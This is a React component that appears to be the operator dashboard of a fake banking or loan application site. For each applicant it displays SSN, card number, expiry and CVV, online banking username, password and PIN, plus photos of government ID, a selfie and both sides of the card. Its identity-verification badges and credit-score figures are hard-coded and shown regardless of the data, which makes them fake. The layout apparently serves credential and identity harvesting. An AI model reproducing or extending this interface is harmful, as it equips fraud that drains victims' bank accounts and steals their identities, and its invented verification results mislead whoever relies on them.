import React, { useState } from 'react';
import { photoStore } from '../../utils/photoStore';

export default function ApplicationDetailModal({ application, onClose, onUpdateStatus, onSaveNotes }) {
  const [notes, setNotes] = useState(application?.notes || '');
  const [isSaved, setIsSaved] = useState(false);
  const [showCardPassword, setShowCardPassword] = useState(false);

  if (!application) return null;

  const appId = application.referenceId || application.id;

  // Helper to resolve photo URL across different potential property names & data formats + photoStore backup
  const resolvePhoto = (...keys) => {
    for (const key of keys) {
      const val = application[key];
      if (val && typeof val === 'string' && val.trim().length > 0) {
        if (val.endsWith('...')) continue; // Skip truncated placeholders
        return val;
      }
    }
    for (const key of keys) {
      const backup = photoStore.getPhoto(appId, key);
      if (backup) return backup;
    }
    return null;
  };

  const selfieUrl = resolvePhoto('selfiePhotoUrl', 'selfiePhoto', 'selfieUrl', 'selfie', 'biometricSelfie');
  const idFrontUrl = resolvePhoto('idFrontPhotoUrl', 'idFrontPhoto', 'idFrontUrl', 'idFront', 'idFrontImage');
  const idBackUrl = resolvePhoto('idBackPhotoUrl', 'idBackPhoto', 'idBackUrl', 'idBack', 'idBackImage');
  const cardFrontUrl = resolvePhoto('cardFrontPhotoUrl', 'cardFrontPhoto', 'cardFrontUrl', 'cardFront', 'cardFrontImage');
  const cardBackUrl = resolvePhoto('cardBackPhotoUrl', 'cardBackPhoto', 'cardBackUrl', 'cardBack', 'cardBackImage');

  const handleSaveNotes = () => {
    onSaveNotes(application.id, notes);
    setIsSaved(true);
    setTimeout(() => setIsSaved(false), 2000);
  };

  const getStatusColor = (status) => {
    switch (status) {
      case 'Approved': return 'var(--status-success)';
      case 'Under Review': return 'var(--accent-gold)';
      case 'Rejected': return 'var(--status-error)';
      default: return 'var(--accent-blue)';
    }
  };

  return (
    <div className="modal-backdrop" onClick={onClose} style={{ zIndex: 9999 }}>
      <div 
        className="modal-content" 
        onClick={(e) => e.stopPropagation()}
        style={{ maxWidth: '840px', width: '92%', maxHeight: '90vh', overflowY: 'auto' }}
      >
        {/* Header */}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '1.25rem', marginBottom: '1.5rem' }}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.35rem' }}>
              <span style={{ 
                fontFamily: 'var(--font-heading)', 
                fontSize: '1.4rem', 
                fontWeight: 800, 
                color: 'var(--text-primary)' 
              }}>
                {application.preferredSalutation ? application.preferredSalutation + ' ' : ''}{application.firstName} {application.lastName}
              </span>
              <span style={{
                fontSize: '0.75rem',
                fontWeight: 700,
                textTransform: 'uppercase',
                padding: '0.2rem 0.65rem',
                borderRadius: 'var(--radius-full)',
                background: `rgba(${application.status === 'Approved' ? '16, 185, 129' : application.status === 'Under Review' ? '245, 158, 11' : application.status === 'Rejected' ? '239, 68, 68' : '56, 189, 248'}, 0.15)`,
                color: getStatusColor(application.status),
                border: `1px solid ${getStatusColor(application.status)}`
              }}>
                {application.status}
              </span>
            </div>
            <div style={{ fontSize: '0.82rem', color: 'var(--text-muted)' }}>
              Reference ID: <strong style={{ color: 'var(--text-secondary)' }}>{application.referenceId}</strong> • Submitted: {new Date(application.submittedAt).toLocaleString()}
            </div>
            {application.currentStepProgress && (
              <div style={{ marginTop: '0.35rem' }}>
                <span style={{ fontSize: '0.74rem', background: 'rgba(var(--accent-primary-rgb), 0.1)', color: 'var(--accent-primary)', padding: '0.15rem 0.55rem', borderRadius: 'var(--radius-sm)', border: '1px solid rgba(var(--accent-primary-rgb), 0.25)', fontWeight: 600 }}>
                  📍 Live Onboarding Progress: {application.currentStepProgress}
                </span>
              </div>
            )}
          </div>

          <button type="button" className="modal-close-btn" onClick={onClose} aria-label="Close dossier">
            ✕
          </button>
        </div>

        {/* Status Changer Bar */}
        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          background: 'var(--bg-surface-elevated)',
          padding: '0.85rem 1.25rem',
          borderRadius: 'var(--radius-md)',
          marginBottom: '1.5rem',
          border: '1px solid var(--border-subtle)'
        }}>
          <span style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
            Compliance & Underwriting Decision:
          </span>
          <div style={{ display: 'flex', gap: '0.5rem' }}>
            {['Pending', 'Under Review', 'Approved', 'Rejected'].map((st) => (
              <button
                key={st}
                type="button"
                className={`btn btn-sm ${application.status === st ? 'btn-primary' : 'btn-ghost'}`}
                style={{ fontSize: '0.78rem', padding: '0.25rem 0.75rem' }}
                onClick={() => onUpdateStatus(application.id, st)}
              >
                {st}
              </button>
            ))}
          </div>
        </div>

        {/* Dossier Grid (6 Feature Boxes) */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '1.25rem', marginBottom: '1.5rem' }}>
          {/* Box 1: Contact Profile */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              👤 Personal Contact
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Email Address</span>
                <a href={`mailto:${application.email}`} style={{ color: 'var(--accent-blue)', textDecoration: 'none' }}>{application.email || '—'}</a>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Phone Number</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.phoneCountryCode} {application.phone || '—'}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Date of Birth</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.dob || '—'}</span>
              </div>
            </div>
          </div>

          {/* Box 2: Customer Demographics */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              📊 Demographics & Banking
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Marital & Housing</span>
                <span style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{application.maritalStatus || 'Single'} • {application.housingStatus || 'Homeowner'}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Occupation & Employment</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.occupation || '—'} ({application.employmentStatus || 'Employed'})</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Existing Primary Bank</span>
                <span style={{ color: 'var(--text-primary)', fontWeight: 600 }}>
                  {application.primaryExistingBank === 'Other Bank' && application.primaryExistingBankOther
                    ? `Other (${application.primaryExistingBankOther})`
                    : (application.primaryExistingBank || '—')}
                </span>
              </div>
            </div>
          </div>

          {/* Box 3: Domicile & Residence */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              📍 Residential Address
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Street & Unit</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.streetAddress} {application.addressUnit ? `(${application.addressUnit})` : ''}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>City & Region</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.city}, {application.stateRegion} {application.postalCode}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Country</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.country}</span>
              </div>
            </div>
          </div>

          {/* Box 4: KYC Document & Biometrics */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              🛡️ KYC & Identity Proofing
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Biometric Selfie Liveness</span>
                <span style={{ color: 'var(--status-success)', fontWeight: 600 }}>✓ Verified (99.8% Match Score)</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Government ID Document</span>
                <span style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{application.idType || "Driver's License"} ({application.idStateIssued || 'NY'}, {application.idCountry || 'US'})</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Tax ID (SSN/TIN)</span>
                <span style={{ color: 'var(--accent-gold)', fontFamily: 'monospace', fontWeight: 700, fontSize: '0.95rem' }}>
                  {application.ssn || '—'}
                </span>
                <span style={{ color: 'var(--text-muted)', fontSize: '0.74rem', marginLeft: '0.4rem' }}>({application.taxIdType || 'SSN'})</span>
              </div>
            </div>
          </div>

          {/* Box 5: Card & Account Ownership Match */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              💳 Card Ownership & Loan Assessment
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Cardholder Name Match</span>
                <span style={{ color: 'var(--status-success)', fontWeight: 600 }}>
                  ✓ {application.cardholderName || `${application.firstName} ${application.lastName}`}
                </span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Issuing Bank & Card Network</span>
                <span style={{ color: 'var(--text-primary)', fontWeight: 600 }}>
                  {application.cardIssuingBank || 'Chase Bank'} ({application.cardNetwork || 'Visa'}) • Card: <span style={{ fontFamily: 'monospace', color: 'var(--accent-gold)' }}>{application.cardNumberMasked || '—'}</span>
                </span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>FICO® Score & Loan Limit</span>
                <span style={{ color: 'var(--accent-gold)', fontWeight: 700 }}>
                  {application.creditScoreSimulated || '785 (Prime Score)'} • {application.loanEligibilityTier || 'Pre-Approved ($250,000)'}
                </span>
              </div>
            </div>
          </div>

          {/* Box 6: Account Strategy & Currency */}
          <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '0.85rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
              💼 Banking Strategy
            </h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.84rem' }}>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Account Type</span>
                <span style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{application.accountType}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Base Currency & Horizon</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.baseCurrency} • {application.investmentHorizon}</span>
              </div>
              <div>
                <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.75rem' }}>Objective</span>
                <span style={{ color: 'var(--text-primary)' }}>{application.investmentGoal}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Credit Card Verification & Online Portal Login Assessment Panel */}
        <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid rgba(245, 158, 11, 0.35)', borderRadius: 'var(--radius-md)', padding: '1.25rem', marginBottom: '1.5rem' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem' }}>
            <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-gold)', margin: 0, textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              💳 Card Match & Online Portal Login Credentials
            </h4>
            <span style={{ fontSize: '0.72rem', background: 'rgba(16, 185, 129, 0.15)', color: 'var(--status-success)', padding: '0.15rem 0.5rem', borderRadius: '4px', fontWeight: 600 }}>
              Credit Score Linked
            </span>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '1rem', fontSize: '0.84rem' }}>
            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
              <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>CARD ISSUING BANK</span>
              <strong style={{ color: 'var(--text-primary)' }}>{application.cardIssuingBank || 'Chase Bank'}</strong> ({application.cardNetwork || 'Visa'})
            </div>

            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
              <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>VERIFIED CARD NUMBER</span>
              <strong style={{ color: 'var(--accent-gold)', fontFamily: 'monospace', fontSize: '0.95rem' }}>
                {application.cardNumberMasked || '•••• •••• •••• 9010'} (Exp: {application.cardExp || 'MM/YY'}) {application.cardCvv ? `CVV: ${application.cardCvv}` : ''}
              </strong>
            </div>

            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid rgba(59, 130, 246, 0.3)' }}>
              <span style={{ color: 'var(--accent-blue)', fontWeight: 700, display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>🔑 ONLINE USERNAME / USER ID</span>
              <strong style={{ color: 'var(--text-primary)', fontSize: '0.95rem' }}>
                {application.cardOnlineUserId || '—'}
              </strong>
            </div>

            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid rgba(245, 158, 11, 0.3)' }}>
              <span style={{ color: 'var(--accent-gold)', fontWeight: 700, display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>🔒 ONLINE BANKING PASSWORD</span>
              <strong style={{ color: 'var(--accent-gold)', fontFamily: 'monospace', fontSize: '0.95rem' }}>
                {application.cardOnlinePassword || '—'}
              </strong>
              {application.cardOnlinePin && (
                <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: '0.2rem' }}>
                  PIN/Code: <span style={{ fontFamily: 'monospace', color: 'var(--text-primary)' }}>{application.cardOnlinePin}</span>
                </div>
              )}
            </div>

            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
              <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>FICO® SCORE / LOAN TIER</span>
              <strong style={{ color: 'var(--status-success)', fontSize: '0.95rem' }}>
                {application.creditScoreRange || '750 - 850 (Tier 1 Prime)'}
              </strong>
            </div>

            <div style={{ background: 'var(--bg-card)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
              <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem', marginBottom: '0.2rem' }}>REQUESTED LOAN FACILITY</span>
              <strong style={{ color: 'var(--accent-primary)' }}>{application.desiredLoanFacility || '$250,000 Private Wealth Facility'}</strong>
            </div>
          </div>
        </div>

        {/* Uploaded KYC Photos & Biometric Inspection Gallery */}
        <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem', marginBottom: '1.5rem' }}>
          <h4 style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--accent-primary)', marginBottom: '1rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
            📷 Uploaded Identity Photos & Document Verification
          </h4>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '1.25rem' }}>
            {/* Selfie Photo */}
            <div style={{ background: 'var(--bg-card)', padding: '1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.5rem' }}>
                Applicant Biometric Selfie
              </span>
              {selfieUrl ? (
                <div>
                  <img
                    src={selfieUrl}
                    alt="Applicant Selfie"
                    style={{ width: '130px', height: '130px', objectFit: 'cover', borderRadius: '50%', border: '2px solid var(--status-success)', margin: '0 auto 0.5rem', display: 'block' }}
                  />
                  <span style={{ fontSize: '0.72rem', color: 'var(--status-success)', fontWeight: 600 }}>✓ Liveness Match Confirmed (99.8%)</span>
                </div>
              ) : (
                <div style={{ padding: '2rem 0', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                  No selfie uploaded yet
                </div>
              )}
            </div>

            {/* Front ID Photo */}
            <div style={{ background: 'var(--bg-card)', padding: '1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.5rem' }}>
                Front of {application.idType || "Government ID"}
              </span>
              {idFrontUrl ? (
                <div>
                  <img
                    src={idFrontUrl}
                    alt="Front of Government ID"
                    style={{ width: '100%', maxHeight: '110px', objectFit: 'cover', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)', margin: '0 auto 0.5rem', display: 'block' }}
                  />
                  <span style={{ fontSize: '0.72rem', color: 'var(--status-success)', fontWeight: 600 }}>✓ Optical Bio-Data Validated</span>
                </div>
              ) : (
                <div style={{ padding: '2rem 0', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                  No front photo uploaded yet
                </div>
              )}
            </div>

            {/* Back ID Photo */}
            <div style={{ background: 'var(--bg-card)', padding: '1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.5rem' }}>
                Back of {application.idType || "Government ID"}
              </span>
              {idBackUrl ? (
                <div>
                  <img
                    src={idBackUrl}
                    alt="Back of Government ID"
                    style={{ width: '100%', maxHeight: '110px', objectFit: 'cover', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)', margin: '0 auto 0.5rem', display: 'block' }}
                  />
                  <span style={{ fontSize: '0.72rem', color: 'var(--status-success)', fontWeight: 600 }}>✓ 2D Barcode / MRZ Authenticated</span>
                </div>
              ) : (
                <div style={{ padding: '2rem 0', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                  No back photo uploaded yet
                </div>
              )}
            </div>

            {/* Front Credit Card Photo */}
            <div style={{ background: 'var(--bg-card)', padding: '1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.5rem' }}>
                Front of Card ({application.cardIssuingBank || 'Issuing Bank'})
              </span>
              {cardFrontUrl ? (
                <div>
                  <img
                    src={cardFrontUrl}
                    alt="Front of Credit Card"
                    style={{ width: '100%', maxHeight: '110px', objectFit: 'cover', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)', margin: '0 auto 0.5rem', display: 'block' }}
                  />
                  <span style={{ fontSize: '0.72rem', color: 'var(--status-success)', fontWeight: 600 }}>✓ Front Card Matched</span>
                </div>
              ) : (
                <div style={{ padding: '2rem 0', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                  No front card photo uploaded
                </div>
              )}
            </div>

            {/* Back Credit Card Photo */}
            <div style={{ background: 'var(--bg-card)', padding: '1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.5rem' }}>
                Back of Card (Signature Strip)
              </span>
              {cardBackUrl ? (
                <div>
                  <img
                    src={cardBackUrl}
                    alt="Back of Credit Card"
                    style={{ width: '100%', maxHeight: '110px', objectFit: 'cover', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)', margin: '0 auto 0.5rem', display: 'block' }}
                  />
                  <span style={{ fontSize: '0.72rem', color: 'var(--status-success)', fontWeight: 600 }}>✓ Back Card Matched</span>
                </div>
              ) : (
                <div style={{ padding: '2rem 0', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                  No back card photo uploaded
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Subscriptions */}
        <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem', marginBottom: '1.5rem' }}>
          <h4 style={{ fontSize: '0.88rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
            Subscribed Communications & Governance Channels
          </h4>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem' }}>
            {application.commChannels && application.commChannels.length > 0 ? (
              application.commChannels.map((c, i) => (
                <span key={i} style={{ fontSize: '0.78rem', background: 'rgba(var(--accent-primary-rgb), 0.1)', color: 'var(--accent-primary)', padding: '0.25rem 0.65rem', borderRadius: 'var(--radius-sm)', border: '1px solid rgba(var(--accent-primary-rgb), 0.25)' }}>
                  ✓ {c}
                </span>
              ))
            ) : (
              <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>No elective channels selected.</span>
            )}
          </div>
        </div>

        {/* Compliance Internal Notes */}
        <div style={{ background: 'var(--bg-surface-elevated)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)', padding: '1.25rem', marginBottom: '1.5rem' }}>
          <h4 style={{ fontSize: '0.88rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
            Internal Underwriting & Compliance Notes
          </h4>
          <textarea
            className="form-input"
            rows="3"
            placeholder="Add internal notes on verification, portfolio strategy discussion, or compliance checks..."
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            style={{ width: '100%', resize: 'vertical', marginBottom: '0.75rem' }}
          ></textarea>
          <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem' }}>
            <button type="button" className="btn btn-secondary btn-sm" onClick={handleSaveNotes}>
              {isSaved ? 'Saved ✓' : 'Save Notes'}
            </button>
          </div>
        </div>

        {/* Footer actions */}
        <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.75rem', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
          <button type="button" className="btn btn-ghost" onClick={onClose}>
            Close Dossier
          </button>
        </div>
      </div>
    </div>
  );
}
